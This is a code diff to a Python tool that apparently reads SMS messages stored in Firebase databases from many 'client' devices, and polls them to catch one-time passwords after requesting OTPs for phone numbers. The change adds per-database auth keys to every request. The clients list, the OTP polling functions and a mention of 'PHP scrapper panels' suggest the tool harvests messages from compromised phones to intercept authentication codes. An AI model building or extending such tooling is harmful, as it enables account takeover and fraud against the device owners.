@@ -96,6 +96,7 @@ DEFAULT_CONFIG = {
         }
     },
     "firebase_urls": [u.strip() for u in os.environ.get("FIREBASE_URLS", "").split(",") if u.strip()],
+    "firebase_dbs": [],
     "otpsms_servers": ["1", "2", "5", "6", "7", "8", "9", "11", "12", "13", "33", "36", "71", "234", "458", "2344", "4566", "64653"],
     "uotp_servers": ["5", "3", "4", "2", "1", "8"],
     "otpdoctor_services": ["13318", "13273"],
@@ -141,6 +142,9 @@ def load_config():
                     merged["firebase_urls"] = DEFAULT_CONFIG["firebase_urls"]
                 elif "firebase_urls" not in merged:
                     merged["firebase_urls"] = []
+                # Keep firebase_dbs from saved config (set via Settings UI)
+                if "firebase_dbs" not in merged:
+                    merged["firebase_dbs"] = []
                 return merged
         except:
             pass
@@ -1222,15 +1226,40 @@ async def fetch_initial_mapping(scan_mode="deep"):
     await emit_log(f"Fetching Firebase clients ({scan_label})...", "info")
     device_map = {}
 
-    urls = config.get("firebase_urls", [])
-    urls = [clean_firebase_url(u) for u in urls if u.strip()]
+    # Build url_key_map: {clean_url: auth_key_or_empty}
+    url_key_map = {}
+    # First load from firebase_dbs (URL + Key pairs from Settings UI)
+    for db in config.get("firebase_dbs", []):
+        raw_url = (db.get("url") or "").strip()
+        key = (db.get("key") or "").strip()
+        if raw_url:
+            cleaned = clean_firebase_url(raw_url)
+            if ".firebaseio.com" in cleaned:
+                url_key_map[cleaned] = key
+    # Also load from firebase_urls (env var / legacy), no key
+    for raw_url in config.get("firebase_urls", []):
+        cleaned = clean_firebase_url(raw_url.strip())
+        if ".firebaseio.com" in cleaned and cleaned not in url_key_map:
+            url_key_map[cleaned] = ""
 
-    # Filter out non-Firebase links (e.g. PHP scrapper panels) so we don't crash on HTML
-    urls = [u for u in urls if ".firebaseio.com" in u]
+    urls = list(url_key_map.keys())
 
     if not urls:
         await emit_log("No valid Firebase URLs configured!", "error")
         return device_map
+
+    def fb_url_with_auth(base_url, path, extra_params=""):
+        """Build Firebase request URL, appending ?auth=KEY if key exists."""
+        key = url_key_map.get(base_url, "")
+        auth_param = f"auth={key}" if key else ""
+        if extra_params and auth_param:
+            return f"{base_url}/{path}?{extra_params}&{auth_param}"
+        elif auth_param:
+            return f"{base_url}/{path}?{auth_param}"
+        elif extra_params:
+            return f"{base_url}/{path}?{extra_params}"
+        else:
+            return f"{base_url}/{path}" 
 
     # Cutoff in milliseconds (Firebase message keys are ms timestamps)
     cutoff_days = 20 if scan_mode == "deepest" else 5
@@ -1244,7 +1273,7 @@ async def fetch_initial_mapping(scan_mode="deep"):
             online_devices = set()
             for attempt in range(3):
                 try:
-                    async with state.http_session.get(f"{fb_url}/clients.json", timeout=90) as resp:
+                    async with state.http_session.get(fb_url_with_auth(fb_url, "clients.json"), timeout=90) as resp:
                         if resp.status == 200:
                             clients_data = await resp.json()
                             if clients_data:
@@ -1272,7 +1301,7 @@ async def fetch_initial_mapping(scan_mode="deep"):
                     for attempt in range(3):
                         try:
                             # Use Firebase query params to fetch only the last 20 messages for this specific device
-                            query_url = f"{fb_url}/messages/{device_id}.json?orderBy=\"$key\"&limitToLast=20"
+                            query_url = fb_url_with_auth(fb_url, f"messages/{device_id}.json", "orderBy=\"$key\"&limitToLast=20")
                             async with state.http_session.get(query_url, timeout=15) as resp:
                                 if resp.status == 200:
                                     msgs = await resp.json()
@@ -1311,7 +1340,7 @@ async def fetch_initial_mapping(scan_mode="deep"):
                 all_device_ids = set()
                 for attempt in range(3):
                     try:
-                        async with state.http_session.get(f"{fb_url}/messages.json?shallow=true", timeout=30) as resp:
+                        async with state.http_session.get(fb_url_with_auth(fb_url, "messages.json", "shallow=true"), timeout=30) as resp:
                             if resp.status == 200:
                                 shallow = await resp.json()
                                 if shallow and isinstance(shallow, dict):
@@ -1337,7 +1366,7 @@ async def fetch_initial_mapping(scan_mode="deep"):
                     async with device_sem:
                         try:
                             async with state.http_session.get(
-                                f"{fb_url}/messages/{device_id}.json?shallow=true", timeout=10
+                                fb_url_with_auth(fb_url, f"messages/{device_id}.json", "shallow=true"), timeout=10
                             ) as resp:
                                 if resp.status == 200:
                                     keys_data = await resp.json()
@@ -1363,7 +1392,7 @@ async def fetch_initial_mapping(scan_mode="deep"):
                     async with device_sem:
                         is_online = device_id in online_devices
                         try:
-                            query_url = f"{fb_url}/messages/{device_id}.json?orderBy=\"$key\"&limitToLast=20"
+                            query_url = fb_url_with_auth(fb_url, f"messages/{device_id}.json", "orderBy=\"$key\"&limitToLast=20")
                             async with state.http_session.get(query_url, timeout=15) as resp:
                                 if resp.status == 200:
                                     msgs = await resp.json()
@@ -1461,7 +1490,7 @@ async def poll_for_otp(fb_url, device_id, known_msg_keys, timeout=45, poll_inter
     async def fetch_single_msg(key):
         """Fetch a single message payload and return (key, data) or None."""
         try:
-            async with state.http_session.get(f"{fb_url}/messages/{device_id}/{key}.json", timeout=10) as msg_resp:
+            async with state.http_session.get(fb_url_with_auth(fb_url, f"messages/{device_id}/{key}.json"), timeout=10) as msg_resp:
                 if msg_resp.status != 200:
                     return None
                 msg_data = await msg_resp.json()
@@ -1474,7 +1503,7 @@ async def poll_for_otp(fb_url, device_id, known_msg_keys, timeout=45, poll_inter
     while asyncio.get_event_loop().time() < deadline:
         try:
             # Fetch just the keys (shallow=true) to find new messages
-            async with state.http_session.get(f"{fb_url}/messages/{device_id}.json?shallow=true", timeout=10) as resp:
+            async with state.http_session.get(fb_url_with_auth(fb_url, f"messages/{device_id}.json", "shallow=true"), timeout=10) as resp:
                 if resp.status != 200:
                     await asyncio.sleep(poll_interval)
                     continue
@@ -1533,7 +1562,7 @@ async def poll_for_otp(fb_url, device_id, known_msg_keys, timeout=45, poll_inter
 async def get_device_message_keys(fb_url, device_id):
     """Get the current set of message keys for a device (snapshot before OTP request)."""
     try:
-        async with state.http_session.get(f"{fb_url}/messages/{device_id}.json?shallow=true", timeout=15) as resp:
+        async with state.http_session.get(fb_url_with_auth(fb_url, f"messages/{device_id}.json", "shallow=true"), timeout=15) as resp:
             if resp.status == 200:
                 data = await resp.json()
                 if isinstance(data, dict):
@@ -1626,7 +1655,7 @@ async def process_firebase_number(device_id, phone, fb_url, speed_delay, attempt
                 known_msg_keys = set(cached_msg_keys)
                 # Quick delta: shallow fetch just the keys (no message bodies, ~200ms)
                 try:
-                    async with state.http_session.get(f"{fb_url}/messages/{device_id}.json?shallow=true", timeout=8) as delta_resp:
+                    async with state.http_session.get(fb_url_with_auth(fb_url, f"messages/{device_id}.json", "shallow=true"), timeout=8) as delta_resp:
                         if delta_resp.status == 200:
                             delta_data = await delta_resp.json()
                             if delta_data and isinstance(delta_data, dict):
